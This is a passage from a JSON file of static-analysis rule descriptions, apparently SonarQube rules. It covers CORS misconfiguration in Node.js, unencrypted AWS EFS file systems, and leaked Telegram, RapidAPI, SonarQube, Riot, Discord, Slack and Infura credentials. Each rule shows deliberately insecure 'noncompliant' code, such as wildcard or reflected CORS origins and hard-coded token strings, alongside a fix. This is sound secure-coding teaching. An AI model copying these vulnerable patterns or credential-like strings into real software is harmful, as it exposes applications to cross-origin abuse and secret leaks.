res.end('ok');\n});\nsrv.listen(3000);\n</pre>\n<p><a href=\"https://www.npmjs.com/package/express\">Express.js</a> framework with <a href=\"https://www.npmjs.com/package/cors\">cors middleware</a>:</p>\n<pre>\nconst cors = require('cors');\n\nlet app1 = express();\napp1.use(cors()); // Sensitive: by default origin is set to *\n\nlet corsOptions = {\n  origin: '*' // Sensitive\n};\n\nlet app2 = express();\napp2.use(cors(corsOptions));\n</pre>\n<p>User-controlled origin:</p>\n<pre>\nfunction (req, res) {\n  const origin = req.header('Origin');\n  res.setHeader('Access-Control-Allow-Origin', origin); // Sensitive\n};\n</pre>\n<h2>Compliant Solution</h2>\n<p><a href=\"https://nodejs.org/api/http.html\">nodejs http</a> built-in module:</p>\n<pre>\nconst http = require('http');\nconst srv = http.createServer((req, res) =&gt; {\n  res.writeHead(200, { 'Access-Control-Allow-Origin': 'trustedwebsite.com' }); // Compliant\n  res.end('ok');\n});\nsrv.listen(3000);\n</pre>\n<p><a href=\"https://www.npmjs.com/package/express\">Express.js</a> framework with <a href=\"https://www.npmjs.com/package/cors\">cors middleware</a>:</p>\n<pre>\nconst cors = require('cors');\n\nlet corsOptions = {\n  origin: 'trustedwebsite.com' // Compliant\n};\n\nlet app = express();\napp.use(cors(corsOptions));\n</pre>\n<p>User-controlled origin validated with an allow-list:</p>\n<pre>\nfunction (req, res) {\n  const origin = req.header('Origin');\n\n  if (trustedOrigins.indexOf(origin) &gt;= 0) {\n    res.setHeader('Access-Control-Allow-Origin', origin);\n  }\n};\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A05_2021-Security_Misconfiguration/\">Top 10 2021 Category A5 - Security Misconfiguration</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/\">Top 10 2021 Category A7 - Identification and\n  Authentication Failures</a> </li>\n  <li> <a href=\"https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS\">developer.mozilla.org</a> - CORS </li>\n  <li> <a href=\"https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy\">developer.mozilla.org</a> - Same origin policy </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration\">Top 10 2017 Category A6 - Security\n  Misconfiguration</a> </li>\n  <li> <a href=\"https://cheatsheetseries.owasp.org/cheatsheets/HTML5_Security_Cheat_Sheet.html#cross-origin-resource-sharing\">OWASP HTML5 Security\n  Cheat Sheet</a> - Cross Origin Resource Sharing </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/346\">CWE-346 - Origin Validation Error</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/942\">CWE-942 - Overly Permissive Cross-domain Whitelist</a> </li>\n</ul>",
        "severity": "MINOR"
      },
      "javascript:S6332": {
        "name": "Using unencrypted EFS file systems is security-sensitive",
        "htmlDesc": "<p>Amazon Elastic File System (EFS) is a serverless file system that does not require provisioning or managing storage. Stored files can be\nautomatically encrypted by the service. In the case that adversaries gain physical access to the storage medium or otherwise leak a message they are\nnot able to access the data.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> The file system contains sensitive data that could cause harm when leaked. </li>\n  <li> There are compliance requirements for the service to store data encrypted. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>It’s recommended to encrypt EFS file systems that contain sensitive information. Encryption and decryption are handled transparently by EFS, so no\nfurther modifications to the application are necessary.</p>\n<h2>Sensitive Code Example</h2>\n<p>For <a href=\"https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_efs.FileSystem.html\"><code>aws_cdk.aws_efs.FileSystem</code></a></p>\n<pre>\nimport { FileSystem } from 'aws-cdk-lib/aws-efs';\n\nnew FileSystem(this, 'unencrypted-explicit', {\n    vpc: new Vpc(this, 'VPC'),\n    encrypted: false // Sensitive\n});\n</pre>\n<p>For <a href=\"https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_efs.CfnFileSystem.html\"><code>aws_cdk.aws_efs.CfnFileSystem</code></a></p>\n<pre>\nimport { CfnFileSystem } from 'aws-cdk-lib/aws-efs';\n\nnew CfnFileSystem(this, 'unencrypted-implicit-cfn', {\n}); // Sensitive as encryption is disabled by default\n</pre>\n<h2>Compliant Solution</h2>\n<p>For <a href=\"https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_efs.FileSystem.html\"><code>aws_cdk.aws_efs.FileSystem</code></a></p>\n<pre>\nimport { FileSystem } from 'aws-cdk-lib/aws-efs';\n\nnew FileSystem(this, 'encrypted-explicit', {\n    vpc: new Vpc(this, 'VPC'),\n    encrypted: true\n});\n</pre>\n<p>For <a href=\"https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_efs.CfnFileSystem.html\"><code>aws_cdk.aws_efs.CfnFileSystem</code></a></p>\n<pre>\nimport { CfnFileSystem } from 'aws-cdk-lib/aws-efs';\n\nnew CfnFileSystem(this, 'encrypted-explicit-cfn', {\n    encrypted: true\n});\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://docs.aws.amazon.com/efs/latest/ug/encryption.html\">AWS Documentation</a> - Data encryption in Amazon EFS </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/311\">CWE-311 - Missing Encryption of Sensitive Data</a> </li>\n</ul>",
        "severity": "MAJOR"
      },
      "secrets:S6701": {
        "name": "Telegram bot keys should not be disclosed",
        "htmlDesc": "<p>Secret leaks often occur when a sensitive piece of authentication data is stored with the source code of an application. Considering the source\ncode is intended to be deployed across multiple assets, including source code repositories or application hosting servers, the secrets might get\nexposed to an unintended audience.</p>\n<h2>Why is this an issue?</h2>\n<p>In most cases, trust boundaries are violated when a secret is exposed in a source code repository or an uncontrolled deployment environment.\nUnintended people who don’t need to know the secret might get access to it. They might then be able to use it to gain unwanted access to associated\nservices or resources.</p>\n<p>The trust issue can be more or less severe depending on the people’s role and entitlement.</p>\n<h3>What is the potential impact?</h3>\n<p>Telegram bot keys are used to authenticate and authorize a bot to interact with the Telegram Bot API. These keys are essentially access tokens that\nallow the bot to send and receive messages, manage groups and channels, and perform other actions on behalf of the bot.</p>\n<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the secret.</p>\n<h4>Compromise of sensitive personal data</h4>\n<p>This kind of service is often used to exchange information that could include personal information, chat logs, and other private data that users\nhave shared on the platform. This is called <a href=\"https://gdpr.eu/eu-gdpr-personal-data/\"><code>Personally Identifiable Information</code></a>.<br>\nThe leaked app key could provide a gateway for unauthorized individuals to access and misuse this data, compromising the privacy and safety of the\napplication users.</p>\n<p>In many industries and locations, there are legal and compliance requirements to protect sensitive data. If this kind of sensitive personal data\ngets leaked, companies face legal consequences, penalties, or violations of privacy laws.</p>\n<h4>Phishing and spam</h4>\n<p>An attacker can use this secret to spam users or lure them into links to a malicious domain controlled by the attacker.</p>\n<p>Spam can cause users to be exposed to the following:</p>\n<ul>\n  <li> Unsolicited, inappropriate content, such as pornographic material </li>\n  <li> Fraudulent attempts to trick users into sending information or money </li>\n  <li> Abusive or hateful statements </li>\n  <li> False advertising or fraudulent claims </li>\n</ul>\n<p>Once a user has been phished on a legitimate-seeming third-party website, an attacker can collect the user’s credentials, bypass multi-factor\nauthentication (MFA), and take over the user’s account on the trusted website.</p>\n<h4>Malware distribution</h4>\n<p>Due to this vulnerability, malware can be stored and spread, both to users of the service and to other potential targets.<br> A malware depends on\nthe attacker’s intentions, as the following examples show:</p>\n<ul>\n  <li> Cryptojacking malware, whose goal is to \"mine\" cryptocurrencies on the affected computers or servers. </li>\n  <li> Spyware that spies out sensitive information from victims. </li>\n</ul>\n<p>In the worst case, malware can cause the target systems to be completely compromised and allow attackers to infiltrate the systems.</p>\n<h2>How to fix it</h2>\n<p><strong>Revoke the secret</strong></p>\n<p>Revoke any leaked secrets and remove them from the application source code.</p>\n<p>Before revoking the secret, ensure that no other applications or processes are using it. Other usages of the secret will also be impacted when the\nsecret is revoked.</p>\n<p><strong>Use a secret vault</strong></p>\n<p>A secret vault should be used to generate and store the new secret. This will ensure the secret’s security and prevent any further unexpected\ndisclosure.</p>\n<p>Depending on the development platform and the leaked secret type, multiple solutions are currently available.</p>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nprops.set(\"api_token\", \"7299363101:AAWJlilLyeMaKgTTrrfsyrtxDqqI-cdI-TF\") // Noncompliant\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nprops.set(\"api_token\", System.getenv(\"API_TOKEN\"))\n</pre>\n<h2>Resources</h2>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/\">Top 10 2021 Category A7 - Identification and\n  Authentication Failures</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">Top 10 2017 Category A3 - Sensitive Data\n  Exposure</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/798\">CWE-798 - Use of Hard-coded Credentials</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/259\">CWE-259 - Use of Hard-coded Password</a> </li>\n</ul>",
        "severity": "BLOCKER"
      },
      "secrets:S6700": {
        "name": "RapidAPI keys should not be disclosed",
        "htmlDesc": "<p>Secret leaks often occur when a sensitive piece of authentication data is stored with the source code of an application. Considering the source\ncode is intended to be deployed across multiple assets, including source code repositories or application hosting servers, the secrets might get\nexposed to an unintended audience.</p>\n<h2>Why is this an issue?</h2>\n<p>In most cases, trust boundaries are violated when a secret is exposed in a source code repository or an uncontrolled deployment environment.\nUnintended people who don’t need to know the secret might get access to it. They might then be able to use it to gain unwanted access to associated\nservices or resources.</p>\n<p>The trust issue can be more or less severe depending on the people’s role and entitlement.</p>\n<h3>What is the potential impact?</h3>\n<p>A RapidAPI key is a unique identifier that allows you to access and use APIs provided by RapidAPI. This key is used to track your API usage, manage\nyour subscriptions, and ensure that you have the necessary permissions to access the APIs you are using. One RapidAPI key can be used to authenticate\nagainst a set of multiple other third-party services, depending on the key entitlement.</p>\n<p>If a RapidAPI key leaks to an unintended audience, it can have several potential consequences. Especially, attackers may use the leaked key to\naccess and utilize the APIs associated with that key without permission. This can result in unauthorized usage of API services, potentially leading to\nmisuse, abuse, or excessive consumption of resources.</p>\n<h2>How to fix it</h2>\n<p><strong>Revoke the secret</strong></p>\n<p>Revoke any leaked secrets and remove them from the application source code.</p>\n<p>Before revoking the secret, ensure that no other applications or processes are using it. Other usages of the secret will also be impacted when the\nsecret is revoked.</p>\n<p><strong>Analyze recent secret use</strong></p>\n<p>When available, analyze authentication logs to identify any unintended or malicious use of the secret since its disclosure date. Doing this will\nallow determining if an attacker took advantage of the leaked secret and to what extent.</p>\n<p>This operation should be part of a global incident response process.</p>\n<p>RapidAPI services include an audit trail feature that can be used to audit malicious use of the compromised key.</p>\n<p><strong>Use a secret vault</strong></p>\n<p>A secret vault should be used to generate and store the new secret. This will ensure the secret’s security and prevent any further unexpected\ndisclosure.</p>\n<p>Depending on the development platform and the leaked secret type, multiple solutions are currently available.</p>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nprops.set(\"rapidapi_key\", \"6f1bbe24b9mshcbb5030202794a4p18f7d0jsndd55ab0f981d\") // Noncompliant\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nprops.set(\"rapidapi_key\", System.getenv(\"rapidapi_key\"))\n</pre>\n<h2>Resources</h2>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/\">Top 10 2021 Category A7 - Identification and\n  Authentication Failures</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">Top 10 2017 Category A3 - Sensitive Data\n  Exposure</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/798\">CWE-798 - Use of Hard-coded Credentials</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/259\">CWE-259 - Use of Hard-coded Password</a> </li>\n</ul>\n<h3>Documentation</h3>\n<ul>\n  <li> RapidAPI Documentation - <a href=\"https://docs.rapidapi.com/docs/keys-and-key-rotation#creating-or-rotating-a-rapid-api-key\">Creating or\n  rotating a Rapid API key</a> </li>\n  <li> RapidAPI Documentation - <a href=\"https://docs.rapidapi.com/docs/org-audit-trails\">Audit Trails</a> </li>\n</ul>",
        "severity": "BLOCKER"
      },
      "secrets:S6702": {
        "name": "SonarQube tokens should not be disclosed",
        "htmlDesc": "<p>Secret leaks often occur when a sensitive piece of authentication data is stored with the source code of an application. Considering the source\ncode is intended to be deployed across multiple assets, including source code repositories or application hosting servers, the secrets might get\nexposed to an unintended audience.</p>\n<h2>Why is this an issue?</h2>\n<p>In most cases, trust boundaries are violated when a secret is exposed in a source code repository or an uncontrolled deployment environment.\nUnintended people who don’t need to know the secret might get access to it. They might then be able to use it to gain unwanted access to associated\nservices or resources.</p>\n<p>The trust issue can be more or less severe depending on the people’s role and entitlement.</p>\n<h3>What is the potential impact?</h3>\n<p>A SonarQube token is a unique key that serves as an authentication mechanism for accessing the SonarQube platform’s APIs. It is used to securely\nauthenticate and authorize external tools or services to interact with SonarQube.</p>\n<p>Tokens are typically generated for specific users or applications and can be configured with different levels of access permissions. By using a\ntoken, external tools or services can perform actions such as analyzing code, retrieving analysis results, creating projects, or managing quality\nprofiles within SonarQube.</p>\n<p>If a SonarQube token leaks to an unintended audience, it can pose a security risk to the SonarQube instance and the associated projects. Attackers\nmay use the leaked token to gain unauthorized access to the SonarQube instance. They can potentially view sensitive information, modify project\nsettings, or perform other dangerous actions.</p>\n<p>Additionally, attackers with access to a token can modify code analysis results. This can lead to false positives or negatives in the analysis,\ncompromising the accuracy and reliability of the platform.</p>\n<h2>How to fix it</h2>\n<p><strong>Revoke the secret</strong></p>\n<p>Revoke any leaked secrets and remove them from the application source code.</p>\n<p>Before revoking the secret, ensure that no other applications or processes are using it. Other usages of the secret will also be impacted when the\nsecret is revoked.</p>\n<p><strong>Analyze recent secret use</strong></p>\n<p>When available, analyze authentication logs to identify any unintended or malicious use of the secret since its disclosure date. Doing this will\nallow determining if an attacker took advantage of the leaked secret and to what extent.</p>\n<p>This operation should be part of a global incident response process.</p>\n<p>The SonarQube audit log can be downloaded from the product web interface and can be used to audit the malicious use of the compromised key. This\nfeature is available starting with SonarQube Enterprise Edition.</p>\n<p><strong>Use a secret vault</strong></p>\n<p>A secret vault should be used to generate and store the new secret. This will ensure the secret’s security and prevent any further unexpected\ndisclosure.</p>\n<p>Depending on the development platform and the leaked secret type, multiple solutions are currently available.</p>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nprops.set(\"sonar_secret\", \"squ_b4556a16fa2d28519d2451a911d2e073024010bc\") // Noncompliant\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nprops.set(\"sonar_secret\", System.getenv(\"SONAR_SECRET\"))\n</pre>\n<h2>Resources</h2>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/\">Top 10 2021 Category A7 - Identification and\n  Authentication Failures</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">Top 10 2017 Category A3 - Sensitive Data\n  Exposure</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/798\">CWE-798 - Use of Hard-coded Credentials</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/259\">CWE-259 - Use of Hard-coded Password</a> </li>\n</ul>\n<h3>Documentation</h3>\n<ul>\n  <li> SonarQube Documentation - <a\n  href=\"https://docs.sonarsource.com/sonarqube/latest/user-guide/user-account/generating-and-using-tokens/\">Generating and using tokens</a> </li>\n  <li> SonarQube Documentation - <a href=\"https://docs.sonarsource.com/sonarqube/latest/instance-administration/security/\">Security</a> </li>\n</ul>",
        "severity": "BLOCKER"
      },
      "secrets:S6704": {
        "name": "Riot API keys should not be disclosed",
        "htmlDesc": "<p>Secret leaks often occur when a sensitive piece of authentication data is stored with the source code of an application. Considering the source\ncode is intended to be deployed across multiple assets, including source code repositories or application hosting servers, the secrets might get\nexposed to an unintended audience.</p>\n<h2>Why is this an issue?</h2>\n<p>In most cases, trust boundaries are violated when a secret is exposed in a source code repository or an uncontrolled deployment environment.\nUnintended people who don’t need to know the secret might get access to it. They might then be able to use it to gain unwanted access to associated\nservices or resources.</p>\n<p>The trust issue can be more or less severe depending on the people’s role and entitlement.</p>\n<h3>What is the potential impact?</h3>\n<p>Riot API keys are used to access the Riot Games API, which provides developers with programmatic access to various data and services related to\nRiot Games' products, such as League of Legends. These API keys are used to authenticate and authorize requests made to the API, allowing developers\nto retrieve game data, player statistics, match history, and other related information.</p>\n<p>If a Riot API key is leaked to an unintended audience, it can have significant consequences. One of the main risks is unauthorized access. The\nunintended audience may exploit the leaked API key to gain entry to the Riot Games API. This can result in the unauthorized retrieval of sensitive\ndata and misuse of services provided by the API. It poses a serious security threat as it allows individuals to access information that they should\nnot have access to, potentially compromising the privacy and integrity of the data.</p>\n<h2>How to fix it</h2>\n<p><strong>Revoke the secret</strong></p>\n<p>Revoke any leaked secrets and remove them from the application source code.</p>\n<p>Before revoking the secret, ensure that no other applications or processes are using it. Other usages of the secret will also be impacted when the\nsecret is revoked.</p>\n<p><strong>Use a secret vault</strong></p>\n<p>A secret vault should be used to generate and store the new secret. This will ensure the secret’s security and prevent any further unexpected\ndisclosure.</p>\n<p>Depending on the development platform and the leaked secret type, multiple solutions are currently available.</p>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nprops.set(\"api_key\", \"RGAPI-924549e3-31a9-406e-9e92-25ed41206dce\") // Noncompliant\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nprops.set(\"api_key\", System.getenv(\"API_KEY\"))\n</pre>\n<h2>Resources</h2>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/\">Top 10 2021 Category A7 - Identification and\n  Authentication Failures</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">Top 10 2017 Category A3 - Sensitive Data\n  Exposure</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/798\">CWE-798 - Use of Hard-coded Credentials</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/259\">CWE-259 - Use of Hard-coded Password</a> </li>\n</ul>",
        "severity": "BLOCKER"
      },
      "secrets:S6708": {
        "name": "Discord Webhook URLs should not be disclosed",
        "htmlDesc": "<p>Secret leaks often occur when a sensitive piece of authentication data is stored with the source code of an application. Considering the source\ncode is intended to be deployed across multiple assets, including source code repositories or application hosting servers, the secrets might get\nexposed to an unintended audience.</p>\n<h2>Why is this an issue?</h2>\n<p>In most cases, trust boundaries are violated when a secret is exposed in a source code repository or an uncontrolled deployment environment.\nUnintended people who don’t need to know the secret might get access to it. They might then be able to use it to gain unwanted access to associated\nservices or resources.</p>\n<p>The trust issue can be more or less severe depending on the people’s role and entitlement.</p>\n<h3>What is the potential impact?</h3>\n<p>The Discord webhook URL grants access to a channel in your server, represented by a bot. A plethora of permissions can be specified in the\n<code>Bot Permissions</code> pane.</p>\n<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the secret.</p>\n<h4>Compromise of sensitive personal data</h4>\n<p>This kind of service is often used to exchange information that could include personal information, chat logs, and other private data that users\nhave shared on the platform. This is called <a href=\"https://gdpr.eu/eu-gdpr-personal-data/\"><code>Personally Identifiable Information</code></a>.<br>\nThe leaked app key could provide a gateway for unauthorized individuals to access and misuse this data, compromising the privacy and safety of the\napplication users.</p>\n<p>In many industries and locations, there are legal and compliance requirements to protect sensitive data. If this kind of sensitive personal data\ngets leaked, companies face legal consequences, penalties, or violations of privacy laws.</p>\n<h4>Phishing and spam</h4>\n<p>An attacker can use this webhook to spam users or lure them into links to a malicious domain controlled by the attacker.</p>\n<p>Spam can cause users to be exposed to the following:</p>\n<ul>\n  <li> Unsolicited, inappropriate content, such as pornographic material </li>\n  <li> Fraudulent attempts to trick users into sending information or money </li>\n  <li> Abusive or hateful statements </li>\n  <li> False advertising or fraudulent claims </li>\n</ul>\n<p>Once a user has been phished on a legitimate-seeming third-party website, an attacker can collect the user’s credentials, bypass multi-factor\nauthentication (MFA), and take over the user’s account on the trusted website.</p>\n<h4>Malware distribution</h4>\n<p>Due to this vulnerability, malware can be stored and spread, both to users of the service and to other potential targets.<br> A malware depends on\nthe attacker’s intentions, as the following examples show:</p>\n<ul>\n  <li> Cryptojacking malware, whose goal is to \"mine\" cryptocurrencies on the affected computers or servers. </li>\n  <li> Spyware that spies out sensitive information from victims. </li>\n</ul>\n<p>In the worst case, malware can cause the target systems to be completely compromised and allow attackers to infiltrate the systems.</p>\n<h2>How to fix it</h2>\n<p><strong>Revoke the secret</strong></p>\n<p>Revoke any leaked secrets and remove them from the application source code.</p>\n<p>Before revoking the secret, ensure that no other applications or processes are using it. Other usages of the secret will also be impacted when the\nsecret is revoked.</p>\n<p><strong>Use a secret vault</strong></p>\n<p>A secret vault should be used to generate and store the new secret. This will ensure the secret’s security and prevent any further unexpected\ndisclosure.</p>\n<p>Depending on the development platform and the leaked secret type, multiple solutions are currently available.</p>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nprops.set(\"discord_webhook_url\", \"https://discord.com/api/webhooks/1143503308481384529/SBkGFYyl6njbyg_DJwhP2x5s4XAzd8Ll5CZQ7HG4xfDRJhOTAIlb0UiPL4ykOZQNIHpd\") // Noncompliant\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nprops.set(\"discord_webhook_url\", System.getenv(\"DISCORD_WEBHOOK_URL\"))\n</pre>\n<h2>Resources</h2>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/\">Top 10 2021 Category A7 - Identification and\n  Authentication Failures</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">Top 10 2017 Category A3 - Sensitive Data\n  Exposure</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/798\">CWE-798 - Use of Hard-coded Credentials</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/259\">CWE-259 - Use of Hard-coded Password</a> </li>\n</ul>",
        "severity": "BLOCKER"
      },
      "secrets:S6713": {
        "name": "Slack incoming webhook URLs should not be disclosed",
        "htmlDesc": "<p>Secret leaks often occur when a sensitive piece of authentication data is stored with the source code of an application. Considering the source\ncode is intended to be deployed across multiple assets, including source code repositories or application hosting servers, the secrets might get\nexposed to an unintended audience.</p>\n<h2>Why is this an issue?</h2>\n<p>In most cases, trust boundaries are violated when a secret is exposed in a source code repository or an uncontrolled deployment environment.\nUnintended people who don’t need to know the secret might get access to it. They might then be able to use it to gain unwanted access to associated\nservices or resources.</p>\n<p>The trust issue can be more or less severe depending on the people’s role and entitlement.</p>\n<h3>What is the potential impact?</h3>\n<p>Slack Incoming Webhook URLs have write-only access to a channel: They can only post messages.</p>\n<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the secret.</p>\n<h4>Phishing and spam</h4>\n<p>An attacker can use this webhook to spam users or lure them into links to a malicious domain controlled by the attacker.</p>\n<p>Spam can cause users to be exposed to the following:</p>\n<ul>\n  <li> Unsolicited, inappropriate content, such as pornographic material </li>\n  <li> Fraudulent attempts to trick users into sending information or money </li>\n  <li> Abusive or hateful statements </li>\n  <li> False advertising or fraudulent claims </li>\n</ul>\n<p>Once a user has been phished on a legitimate-seeming third-party website, an attacker can collect the user’s credentials, bypass multi-factor\nauthentication (MFA), and take over the user’s account on the trusted website.</p>\n<h4>Malware distribution</h4>\n<p>Due to this vulnerability, malware can be stored and spread, both to users of the service and to other potential targets.<br> A malware depends on\nthe attacker’s intentions, as the following examples show:</p>\n<ul>\n  <li> Cryptojacking malware, whose goal is to \"mine\" cryptocurrencies on the affected computers or servers. </li>\n  <li> Spyware that spies out sensitive information from victims. </li>\n</ul>\n<p>In the worst case, malware can cause the target systems to be completely compromised and allow attackers to infiltrate the systems.</p>\n<h2>How to fix it</h2>\n<p><strong>Revoke the secret</strong></p>\n<p>Revoke any leaked secrets and remove them from the application source code.</p>\n<p>Before revoking the secret, ensure that no other applications or processes are using it. Other usages of the secret will also be impacted when the\nsecret is revoked.</p>\n<p><strong>Use a secret vault</strong></p>\n<p>A secret vault should be used to generate and store the new secret. This will ensure the secret’s security and prevent any further unexpected\ndisclosure.</p>\n<p>Depending on the development platform and the leaked secret type, multiple solutions are currently available.</p>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nprops.set(\"slack_webhook_url\", \"https://hooks.slack.com/services/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\") // Noncompliant\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nprops.set(\"slack_webhook_url\", System.getenv(\"SLACK_WEBHOOK_URL\"))\n</pre>\n<h2>Resources</h2>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/\">Top 10 2021 Category A7 - Identification and\n  Authentication Failures</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">Top 10 2017 Category A3 - Sensitive Data\n  Exposure</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/798\">CWE-798 - Use of Hard-coded Credentials</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/259\">CWE-259 - Use of Hard-coded Password</a> </li>\n</ul>",
        "severity": "BLOCKER"
      },
      "secrets:S6783": {
        "name": "Infura API keys should not be disclosed",
        "htmlDesc": "<p>Secret leaks often occur when a sensitive piece of authentication data is stored with the source code of an application. Considering the source\ncode is intended to be deployed across multiple assets, including source code repositories or application hosting servers, the secrets might get\nexposed to an unintended audience.</p>\n<h2>Why is this an issue?</h2>\n<p>In most cases, trust boundaries are violated when a secret is exposed in a source code repository or an uncontrolled deployment environment.\nUnintended people who don’t need to know the secret might get access to it. They might then be able to use it to gain unwanted access to associated\nservices or resources.</p>\n<p>The trust issue can be more or less severe depending on the people’s role and entitlement.</p>\n<h3>What is the potential impact?</h3>\n<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the secret.</p>\n<h4>Disclosure of blockchain data</h4>\n<p>The leaked key can be used to query APIs of blockchain services and access sensitive information stored in the service metadata. This may include\nuser identities and other sensitive data.<br> Such disclosure compromises user privacy and confidentiality.</p>\n<h4>Breach of trust in non-repudiation and disruption of the audit trail</h4>\n<p>When such a secret is compromised, malicious actors might have the possibility to send malicious event objects, causing discrepancies in the audit\ntrail. This can make it difficult to trace and verify the sequence of events, impacting the ability to investigate and identify unauthorized or\nfraudulent activity.</p>\n<p>All in all, this can lead to problems in proving the validity of transactions or actions performed, potentially leading to disputes and legal\ncomplications.</p>\n<h4>Financial loss</h4>\n<p>Since this secret is used to process transaction-related operations, financial loss may also occur if transaction-related objects are corrupted or\nthe account is tampered with.<br> This can range from indirect losses to direct unauthorized transfers of funds that can lead to bankruptcy or\nimpoverishment of individuals.</p>\n<h2>How to fix it</h2>\n<p><strong>Revoke the secret</strong></p>\n<p>Revoke any leaked secrets and remove them from the application source code.</p>\n<p>Before revoking the secret, ensure that no other applications or processes are using it. Other usages of the secret will also be impacted when the\nsecret is revoked.</p>\n<p><strong>Use a secret vault</strong></p>\n<p>A secret vault should be used to generate and store the new secret. This will ensure the secret’s security and prevent any further unexpected\ndisclosure.</p>\n<p>Depending on the development platform and the leaked secret type, multiple solutions are currently available.</p>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nprops.set(\"infura_api_key\", \"https://mainnet.infura.io/v3/f6fc4aa25abb16e901876269d01f2ec5\") // Noncompliant\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nprops.set(\"infura_api_key\", System.getenv(\"INFURA_API_KEY\"))\n</pre>\n<h2>Resources</h2>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/\">Top 10 2021 Category A7 - Identification and\n  Authentication Failures</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">Top 10 2017 Category A3 - Sensitive Data\n  Exposure</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/798\">CWE-798 - Use of 